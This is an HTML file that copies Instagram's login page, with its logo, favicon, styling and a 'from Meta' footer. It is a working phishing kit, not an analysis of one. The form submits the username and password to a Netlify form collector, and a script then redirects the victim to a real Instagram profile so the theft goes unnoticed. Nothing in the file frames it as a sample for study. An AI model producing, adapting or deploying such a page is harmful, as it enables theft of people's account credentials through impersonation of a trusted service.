<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #fff;
      padding: 40px;
      border: 1px solid #dbdbdb;
      width: 350px;
      text-align: center;
    }
    .logo {
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #0095f6;
      border: none;
      color: white;
      font-weight: bold;
      cursor: pointer;
      border-radius: 4px;
      margin-top: 12px;
    }
    .note {
      margin-top: 20px;
      color: #999;
      font-size: 12px;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo" width="180"/>
    
    <form name="login-form" method="POST" data-netlify="true" onsubmit="redirectAfterSubmit()">
      <input name="username" type="text" placeholder="Phone number, username, or email" required />
      <input name="password" type="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>

    <div class="note">Â© 2025 Instagram from Meta</div>
  </div>

  <script>
    function redirectAfterSubmit() {
      setTimeout(function () {
        window.location.href = "https://www.instagram.com/marsha_cute_bea";
      }, 1000);
    }
  </script>

</body>
</html>
